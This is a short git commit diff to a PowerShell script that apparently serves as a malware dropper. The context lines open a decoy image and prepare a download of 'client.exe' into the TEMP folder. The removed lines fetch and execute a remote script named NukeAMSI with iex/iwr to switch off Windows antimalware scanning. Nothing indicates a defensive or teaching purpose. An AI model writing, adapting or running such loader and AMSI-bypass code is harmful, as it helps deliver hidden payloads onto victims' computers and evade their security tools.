09777a1cb17fc11e3fef96b51896b52727ca6af7
Your Name <you@example.com>
2025-02-23 04:09:53 -0800

    'f'

--- script-ps.ps1
+++ script-ps.ps1
@@ -5,9 +5,6 @@ try {
     # Open the downloaded image
     Start-Process "$env:TEMP\blue-bird.jpg"
 
-    # Nuke
-    iex (iwr "https://raw.githubusercontent.com/anonymous300502/Nuke-AMSI/main/NukeAMSI.ps1" -UseBasicParsing).Content
-    
     # Download the client.exe file
     $exeUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/client.exe"
     $exePath = "$env:TEMP\client.exe"
